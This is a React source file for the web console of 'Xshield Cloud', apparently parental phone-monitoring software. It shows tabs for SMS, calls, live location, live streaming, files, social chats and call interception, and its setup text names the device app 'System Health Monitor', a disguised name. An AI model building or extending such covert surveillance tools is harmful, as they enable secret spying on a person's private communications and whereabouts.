import { useEffect, useState } from 'react';
import { useDeviceStore, startDevicesListListener, startDeviceListeners } from './store/deviceStore';
import { DashboardOverview } from './components/DashboardOverview';
import { LiveTracking } from './components/LiveTracking';
import { CallLogs } from './components/CallLogs';
import { MessageLogs } from './components/MessageLogs';
import { AppControl } from './components/AppControl';
import { LiveStreaming } from './components/LiveStreaming';
import { FileExplorer } from './components/FileExplorer';
import { ScheduleRestriction } from './components/ScheduleRestriction';
import { InstantMessaging } from './components/InstantMessaging';
import { SettingsControl } from './components/SettingsControl';
import { MoreFeatures } from './components/MoreFeatures';
import { ActiveCallController } from './components/ActiveCallController';
import { LiveRepository } from './firebase/liveRepository';
import { ContactsList } from './components/ContactsList';
import { AnalyticsDashboard } from './components/AnalyticsDashboard';
import { CaptureGallery } from './components/CaptureGallery';
import { Pictures } from './components/Pictures';

import { 
  Shield, Phone, MessageSquare, 
  AppWindow, MapPin, Radio, FolderOpen, 
  Clock, MessageCircle, Settings, Globe, UserCheck, ChevronDown, Trash2,
  Users, BarChart3, ChevronLeft, ChevronRight, Image, Images
} from 'lucide-react';

export default function App() {
  const { selectedDevice, devices, namesMap, presence, setSelectedDevice } = useDeviceStore();
  const [activeTab, setActiveTab] = useState('Dashboard');
  const [deviceDropdownOpen, setDeviceDropdownOpen] = useState(false);
  const [isSidebarCollapsed, setIsSidebarCollapsed] = useState(() => {
    return localStorage.getItem('isSidebarCollapsed') === 'true';
  });

  // Initialize listeners
  useEffect(() => {
    startDevicesListListener();
  }, []);

  const handleSwitchDevice = (deviceId: string) => {
    setSelectedDevice(deviceId);
    startDeviceListeners(deviceId);
    setDeviceDropdownOpen(false);
  };

  const handleUnlinkDevice = async (deviceId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    if (window.confirm(`Unlink and completely delete device ${namesMap[deviceId] || deviceId} from cloud records?`)) {
      try {
        await LiveRepository.deleteDevice(deviceId);
        alert('Device successfully unlinked.');
      } catch (err) {
        console.error(err);
      }
    }
  };

  const menuItems = [
    { name: 'Dashboard', icon: Shield },
    { name: 'SMS', icon: MessageSquare },
    { name: 'Calls', icon: Phone },
    { name: 'Pictures', icon: Images },
    { name: 'Live Tracking', icon: MapPin },
    { name: 'Live Streaming', icon: Radio },
    { name: 'Capture Gallery', icon: Image },
    { name: 'File Explorer', icon: FolderOpen },
    { name: 'App Control', icon: AppWindow },
    { name: 'Schedules', icon: Clock },
    { name: 'Social Chat', icon: MessageCircle },
    { name: 'Web History', icon: Globe },
    { name: 'Settings Override', icon: Settings },
    { name: 'My Account', icon: UserCheck }
  ];

  return (
    <div className="flex h-screen w-screen bg-darkBg text-slate-800 font-sans overflow-hidden">
      {/* 1. Sidebar Panel */}
      <aside className={`bg-darkSurf border-r border-darkBorder flex flex-col shrink-0 z-20 transition-all duration-300 ease-in-out ${isSidebarCollapsed ? 'w-[76px]' : 'w-[280px]'}`}>
        {/* Brand Header */}
        <div className={`border-b border-darkBorder flex items-center justify-between gap-2 transition-all ${isSidebarCollapsed ? 'flex-col py-6 px-2' : 'px-6 py-5'}`}>
          <div className="flex items-center gap-3">
            <div className="h-10 w-10 bg-brandCyan/15 text-brandCyan rounded-xl flex items-center justify-center border border-brandCyan/25 shrink-0">
              <Shield className="h-5 w-5" />
            </div>
            {!isSidebarCollapsed && (
              <div className="transition-all duration-200">
                <h1 className="text-sm font-black text-slate-800 tracking-widest uppercase">Xshield Cloud</h1>
                <p className="text-[9px] font-bold text-brandCyan uppercase tracking-wider mt-0.5">Parent Web Console</p>
              </div>
            )}
          </div>
          
          {/* Toggle Button */}
          <button
            onClick={() => {
              const next = !isSidebarCollapsed;
              setIsSidebarCollapsed(next);
              localStorage.setItem('isSidebarCollapsed', String(next));
            }}
            className={`p-1.5 rounded-lg border border-darkBorder hover:border-brandCyan/30 text-mutedText hover:text-brandCyan transition-all cursor-pointer ${isSidebarCollapsed ? 'mt-3' : ''}`}
            title={isSidebarCollapsed ? "Expand Sidebar" : "Collapse Sidebar"}
          >
            {isSidebarCollapsed ? <ChevronRight className="h-4 w-4" /> : <ChevronLeft className="h-4 w-4" />}
          </button>
        </div>

        {/* Navigation Links */}
        <nav className={`space-y-1 overflow-y-auto min-h-0 ${isSidebarCollapsed ? 'p-2' : 'p-4'}`}>
          {menuItems.map((item) => {
            const Icon = item.icon;
            const isActive = activeTab === item.name;
            return (
              <button
                key={item.name}
                onClick={() => setActiveTab(item.name)}
                title={isSidebarCollapsed ? item.name : undefined}
                className={`w-full py-2.5 rounded-xl font-semibold text-xs flex items-center transition-all ${
                  isSidebarCollapsed ? 'justify-center px-0' : 'px-4 gap-3.5'
                } ${
                  isActive 
                    ? 'bg-brandCyan/10 text-brandCyan border-l-4 border-brandCyan' 
                    : 'text-mutedText hover:bg-darkBg hover:text-slate-800'
                }`}
              >
                <Icon className={`h-4.5 w-4.5 shrink-0 ${isActive ? 'text-brandCyan' : 'text-mutedText'}`} />
                {!isSidebarCollapsed && <span className="truncate">{item.name}</span>}
              </button>
            );
          })}
        </nav>

        {/* Console footer */}
        <div className={`border-t border-darkBorder text-[10px] text-mutedText text-center font-bold transition-all ${isSidebarCollapsed ? 'py-6 px-1' : 'p-6'}`}>
          {isSidebarCollapsed ? '©' : `© ${new Date().getFullYear()} Xshield Secure Portal`}
        </div>
      </aside>

      {/* 2. Main Workstation Panel */}
      <div className="flex-1 flex flex-col min-w-0 overflow-hidden relative">
        {/* Responsive Header */}
        <header className="h-[76px] bg-darkSurf border-b border-darkBorder flex items-center justify-between px-8 z-10">
          <div className="flex items-center gap-2">
            <span className={`h-2.5 w-2.5 rounded-full ${presence.state === 'online' ? 'bg-brandTeal animate-pulse' : 'bg-brandRed'}`} />
            <h2 className="text-sm font-bold text-slate-800 uppercase tracking-wider">
              {activeTab} Module
            </h2>
          </div>

          {/* Header Action Buttons & Device Selection */}
          <div className="flex items-center gap-3">
            {/* History / Analytics / Contacts — visible only on Calls-related pages */}
            {(activeTab === 'Calls' || activeTab === 'Analytics' || activeTab === 'Contacts') && (
              <>
                {/* History Shortcut Button */}
                <button
                  onClick={() => setActiveTab('Calls')}
                  className={`flex items-center gap-1.5 px-3 py-2 border rounded-xl text-xs font-bold transition-all cursor-pointer ${
                    activeTab === 'Calls'
                      ? 'bg-brandCyan/15 border-brandCyan text-brandCyan'
                      : 'bg-darkBg/50 border-darkBorder hover:border-brandCyan text-slate-700 hover:text-brandCyan'
                  }`}
                >
                  <Clock className="h-4 w-4" />
                  <span>History</span>
                </button>

                {/* Analytics Shortcut Button */}
                <button
                  onClick={() => setActiveTab('Analytics')}
                  className={`flex items-center gap-1.5 px-3 py-2 border rounded-xl text-xs font-bold transition-all cursor-pointer ${
                    activeTab === 'Analytics'
                      ? 'bg-brandCyan/15 border-brandCyan text-brandCyan'
                      : 'bg-darkBg/50 border-darkBorder hover:border-brandCyan text-slate-700 hover:text-brandCyan'
                  }`}
                >
                  <BarChart3 className="h-4 w-4" />
                  <span>Analytics</span>
                </button>

                {/* Contacts Shortcut Button */}
                <button
                  onClick={() => setActiveTab('Contacts')}
                  className={`flex items-center gap-1.5 px-3 py-2 border rounded-xl text-xs font-bold transition-all cursor-pointer ${
                    activeTab === 'Contacts'
                      ? 'bg-brandCyan/15 border-brandCyan text-brandCyan'
                      : 'bg-darkBg/50 border-darkBorder hover:border-brandCyan text-slate-700 hover:text-brandCyan'
                  }`}
                >
                  <Users className="h-4 w-4" />
                  <span>Contacts</span>
                </button>
              </>
            )}

            {/* Device Selection dropdown */}
            <div className="relative">
              <button
                onClick={() => setDeviceDropdownOpen(!deviceDropdownOpen)}
                className="flex items-center gap-2 px-4 py-2 bg-darkBg border border-darkBorder hover:border-brandCyan rounded-xl text-xs font-bold transition-all"
              >
                <span>{namesMap[selectedDevice] || selectedDevice || 'Select Device'}</span>
                <ChevronDown className="h-4 w-4 text-mutedText" />
              </button>

              {deviceDropdownOpen && (
                <div className="absolute right-0 mt-2 w-[240px] bg-darkSurf border border-darkBorder rounded-xl shadow-2xl py-2 z-50">
                  {devices.length === 0 ? (
                    <p className="text-xs italic text-mutedText text-center py-4">No child devices linked.</p>
                  ) : (
                    devices.map((devId) => (
                      <div
                        key={devId}
                        onClick={() => handleSwitchDevice(devId)}
                        className={`flex justify-between items-center px-4 py-2.5 text-xs font-bold cursor-pointer hover:bg-darkBg/60 transition-all ${
                          selectedDevice === devId ? 'text-brandCyan bg-darkBg/30' : 'text-slate-700'
                        }`}
                      >
                        <span className="truncate max-w-[140px]">{namesMap[devId] || devId}</span>
                        {devices.length > 1 && (
                          <button
                            onClick={(e) => handleUnlinkDevice(devId, e)}
                            className="p-1 hover:bg-brandRed/15 text-brandRed rounded transition-all"
                            title="Unlink device"
                          >
                            <Trash2 className="h-3.5 w-3.5" />
                          </button>
                        )}
                      </div>
                    ))
                  )}
                </div>
              )}
            </div>
          </div>
        </header>

        {/* Central View Dashboard Area */}
        <main className="flex-1 overflow-y-auto p-8">
          {selectedDevice ? (
            <>
              {activeTab === 'Dashboard' && <DashboardOverview onNavigate={(tab) => {
                if (tab === 'Calls') {
                  setActiveTab('Calls');
                } else if (tab === 'SMS') {
                  setActiveTab('SMS');
                } else {
                  setActiveTab(tab);
                }
              }} />}
              {activeTab === 'SMS' && <MessageLogs />}
              {activeTab === 'Calls' && <CallLogs />}
              {activeTab === 'Pictures' && <Pictures />}
              {activeTab === 'Contacts' && <ContactsList />}
              {activeTab === 'Analytics' && <AnalyticsDashboard />}
              {activeTab === 'Live Tracking' && <LiveTracking />}
              {activeTab === 'Live Streaming' && <LiveStreaming />}
              {activeTab === 'Capture Gallery' && <CaptureGallery />}
              {activeTab === 'File Explorer' && <FileExplorer />}
              {activeTab === 'App Control' && <AppControl />}
              {activeTab === 'Schedules' && <ScheduleRestriction />}
              {activeTab === 'Social Chat' && <InstantMessaging />}
              {activeTab === 'Web History' && <MoreFeatures initialTab="History" />}
              {activeTab === 'Settings Override' && <SettingsControl />}
              {activeTab === 'My Account' && <MoreFeatures initialTab="Account" />}
            </>
          ) : (
            <div className="h-full flex flex-col items-center justify-center text-center p-6">
              <Shield className="h-16 w-16 text-mutedText/40 mb-3 animate-pulse" />
              <h3 className="text-lg font-bold text-slate-800">No Target Device Linked</h3>
              <p className="text-xs text-mutedText mt-2 max-w-[320px]">
                Install the System Health Monitor APK on the child's device and tap activate. The device will automatically sync and link here.
              </p>
            </div>
          )}
        </main>
      </div>

      {/* Realtime Call Alerts Interceptor dialog */}
      <ActiveCallController />
    </div>
  );
}
